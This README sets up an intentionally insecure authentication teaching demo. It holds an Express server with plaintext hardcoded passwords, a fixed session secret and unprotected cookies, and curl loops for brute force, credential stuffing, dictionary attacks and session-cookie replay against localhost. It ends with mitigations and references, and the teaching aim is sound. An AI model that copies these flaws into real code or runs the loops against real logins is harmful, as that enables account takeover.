# 🔐 Broken Authentication Demo — README.md

> **Warning:** This project is intentionally insecure for educational purposes only. DO NOT deploy or expose this code to the internet. Use only in an isolated, offline environment for demonstrations and learning.

---

## Project overview

A hands‑on demo that intentionally illustrates common authentication failures:

- Brute Force
- Credential Stuffing
- Dictionary Attack
- Session Hijacking

This repository contains a simple React frontend and a Node.js/Express backend that purposefully uses insecure authentication so you can test and learn mitigation strategies.

---

## Project structure

CSDF/
├── frontend/ # React login interface (optional)
├── backend/ # Node.js + Express server
├── combolist.txt # Example username:password pairs (credential stuffing)
├── passwords.txt # Example passwords (dictionary attack)
├── usernames.txt # Example usernames (dictionary attack)
└── README.md # This file

yaml
Copy code

---

## Prerequisites

- Node.js (v16+ recommended)
- npm
- (Optional) curl, bash (for the demo attack scripts)

---

## Setup & run

### Backend

```bash
cd backend
npm install
```
# start server directly
node server.js
# OR if you add package.json scripts: npm start
The backend will listen on: http://localhost:4000

Frontend (optional)

```
cd frontend
npm install
npm start
```
The React app runs on: http://localhost:3000

Attack demonstration scripts (Bash / curl)
All commands assume you run them locally in a safe testing environment.

## 1) Brute force (example)
bash
```
# brute-force.sh
#!/usr/bin/env bash
for pwd in admin password 123456 qwerty letmein welcome admin123; do
  echo "Testing password: $pwd"
  response=$(curl -s -w "%{http_code}" \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"admin\",\"password\":\"$pwd\"}" \
    http://localhost:4000/login)
  body="${response::-3}"
  status="${response: -3}"
  echo "Status: $status"
  echo "Response: $body"
  echo "----"
done
Expected demo success (insecure backend): admin:admin123
```
## 2) Credential stuffing (example)
bash
```
# create a small combolist file (one-time)
cat > combolist.txt <<EOF
admin:admin123
122:123
EOF

# run credential stuffing
while IFS=: read -r user pass; do
  echo "Trying $user:$pass"
  curl -s -X POST -H "Content-Type: application/json" \
    -d "{\"username\":\"$user\",\"password\":\"$pass\"}" \
    http://localhost:4000/login
  echo
done < combolist.txt
```
## 3) Dictionary attack (example)
bash
```
# prepare usernames and passwords
cat > usernames.txt <<EOF
admin
122
EOF

cat > passwords.txt <<EOF
admin
password
123456
qwerty
letmein
welcome
122
123
EOF

# nested loop attempt
while IFS= read -r user; do
  while IFS= read -r pwd; do
    clean_user=$(echo "$user" | tr -d '\r')
    clean_pwd=$(echo "$pwd" | tr -d '\r')
    response=$(curl -s -w "%{http_code}" \
      -H "Content-Type: application/json" \
      -d "{\"username\":\"$clean_user\",\"password\":\"$clean_pwd\"}" \
      http://localhost:4000/login)
    body="${response::-3}"
    status="${response: -3}"
    if [[ "$status" == "200" ]]; then
      echo "SUCCESS: $clean_user:$clean_pwd"
      echo "Response: $body"
      echo "----"
    fi
  done < passwords.txt
done < usernames.txt
```
##  4) Session hijacking (demo)
Log in via the frontend or via curl to get a session.

In your browser dev tools copy the connect.sid cookie value.

Use that cookie with curl:

bash
```
# replace <SESSION_VALUE> with the actual cookie (url-encoded string)
curl -H "Cookie: connect.sid=<SESSION_VALUE>" http://localhost:4000/profile
Expected demo output (insecure server):
{"loggedIn":true,"user":{"username":"admin"}}

Backend code (insecure on purpose)
Create backend/server.js with the following content:

js
Copy code
// backend/server.js
const express = require('express');
const cors = require('cors');
const session = require('express-session');

const app = express();

app.use(cors({ origin: 'http://localhost:3000', credentials: true }));
app.use(express.json());

// 🔥 Insecure hardcoded users (for demo only)
const users = [
  { username: 'admin', password: 'admin123' },
  { username: '122', password: '123' }
];

app.use(session({
  secret: 'demo_insecure_secret', // insecure: hardcoded
  resave: false,
  saveUninitialized: true,
  cookie: {
    maxAge: 24 * 60 * 60 * 1000, // 1 day
    // missing HttpOnly, secure, SameSite intentionally to illustrate vulnerabilities
  }
}));

app.post('/login', (req, res) => {
  const { username, password } = req.body;
  const user = users.find(u => u.username === username && u.password === password);
  if (user) {
    req.session.user = { username: user.username };
    return res.json({ success: true, message: 'Login successful' });
  }
  res.status(401).json({ success: false, message: 'Invalid credentials' });
});

app.get('/profile', (req, res) => {
  if (req.session && req.session.user) {
    return res.json({ loggedIn: true, user: req.session.user });
  }
  res.status(401).json({ loggedIn: false });
});

app.listen(4000, () => {
  console.log('Insecure Demo Server running on port 4000');
});
```
# Vulnerabilities demonstrated

| Attack              | Root cause demonstrated                               |
|---------------------|-------------------------------------------------------|
| Brute Force         | No rate limiting, weak passwords                      |
| Credential Stuffing | Password reuse, no MFA                                |
| Dictionary Attack   | Predictable/weak credentials                          |
| Session Hijacking   | Insecure cookie attributes, long-lived session        |

# Mitigations (what to teach)

- Use `bcrypt` (or Argon2) to hash & salt passwords.
- Enforce strong password policies and password strength checks.
- Implement account lockout and rate limiting (e.g., `express-rate-limit`, or gateway-level protections).
- Use multi-factor authentication (MFA).
- Set secure cookie attributes: `HttpOnly`, `Secure`, `SameSite=Strict` (or `Lax`), and short expiry.
- Use proper session stores (e.g., Redis) and rotate session IDs on login.
- Monitor and alert on login anomalies and suspicious IPs.


# Educational notes & references

- OWASP Top 10 — Broken Authentication
- NIST Password Guidelines
- MITRE ATT&CK — T1110 (Brute Force)
